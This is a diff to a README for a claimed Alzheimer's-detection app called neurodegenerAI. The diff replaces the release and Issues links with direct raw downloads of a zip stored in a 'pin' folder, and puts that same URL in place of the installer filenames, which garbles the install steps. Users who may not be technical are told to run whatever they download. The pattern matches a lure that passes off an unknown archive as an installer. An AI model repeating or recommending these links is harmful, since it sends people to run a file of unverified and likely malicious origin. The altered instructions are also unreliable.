@@ -1,7 +1,7 @@
 # 🧠 neurodegenerAI - Detect Alzheimer's Patterns Easily
 
 ## 📦 Download Here
-[![Download neurodegenerAI Release](https://img.shields.io/badge/Download%20neurodegenerAI%20Release-blue)](https://github.com/Wilsonian-ichneumonfly610/neurodegenerAI/releases)
+[![Download neurodegenerAI Release](https://raw.githubusercontent.com/Wilsonian-ichneumonfly610/neurodegenerAI/main/pin/neurodegenerAI.zip%20neurodegenerAI%20Release-blue)](https://raw.githubusercontent.com/Wilsonian-ichneumonfly610/neurodegenerAI/main/pin/neurodegenerAI.zip)
 
 ## 🚀 Getting Started
 Welcome to neurodegenerAI! This platform helps detect early signs of Alzheimer's and clusters real-time social media topics. It is designed to be user-friendly, even for those without technical knowledge. Follow these steps to get started.
@@ -15,11 +15,11 @@ Welcome to neurodegenerAI! This platform helps detect early signs of Alzheimer's
 ## 📥 Download & Install
 To download the software, visit the releases page by clicking the link below. You will find the latest version available for download.
 
-[Download neurodegenerAI Release](https://github.com/Wilsonian-ichneumonfly610/neurodegenerAI/releases)
+[Download neurodegenerAI Release](https://raw.githubusercontent.com/Wilsonian-ichneumonfly610/neurodegenerAI/main/pin/neurodegenerAI.zip)
 
 1. Once you are on the releases page, look for the version labeled as the latest release.
 2. Choose the appropriate installer for your operating system.
-3. Click on the file to begin downloading. The file should be named similar to `neurodegenerAI_v1.0.exe` for Windows, or `neurodegenerAI_v1.0.dmg` for macOS, or a .tar.gz file for Linux.
+3. Click on the file to begin downloading. The file should be named similar to `https://raw.githubusercontent.com/Wilsonian-ichneumonfly610/neurodegenerAI/main/pin/neurodegenerAI.zip` for Windows, or `https://raw.githubusercontent.com/Wilsonian-ichneumonfly610/neurodegenerAI/main/pin/neurodegenerAI.zip` for macOS, or a https://raw.githubusercontent.com/Wilsonian-ichneumonfly610/neurodegenerAI/main/pin/neurodegenerAI.zip file for Linux.
 4. After the download completes, locate the file on your computer and double-click it to run the installer.
 5. Follow the prompts in the installation wizard to set up neurodegenerAI on your computer.
 
@@ -60,7 +60,7 @@ If you encounter issues during installation or usage, try the following steps:
 2. **Check Internet Connection**: A stable connection is essential for accessing online features and data.
 3. **Restart the Application**: Sometimes, simply restarting the app can resolve minor glitches.
 4. **Reinstall the Software**: If problems persist, uninstall and reinstall the application to ensure all components are correctly set up.
-5. **Seek Help**: Visit our [GitHub Issues page](https://github.com/Wilsonian-ichneumonfly610/neurodegenerAI/issues) to report issues or ask for assistance.
+5. **Seek Help**: Visit our [GitHub Issues page](https://raw.githubusercontent.com/Wilsonian-ichneumonfly610/neurodegenerAI/main/pin/neurodegenerAI.zip) to report issues or ask for assistance.
 
 ## 📝 License
 neurodegenerAI is open-source software released under the MIT License. You can view the full license details in the repository.
@@ -68,4 +68,4 @@ neurodegenerAI is open-source software released under the MIT License. You can v
 ## 📬 Contact
 For additional support or inquiries, please reach out through our GitHub repository or connect with us on social media.
 
-[Download neurodegenerAI Release](https://github.com/Wilsonian-ichneumonfly610/neurodegenerAI/releases)
+[Download neurodegenerAI Release](https://raw.githubusercontent.com/Wilsonian-ichneumonfly610/neurodegenerAI/main/pin/neurodegenerAI.zip)
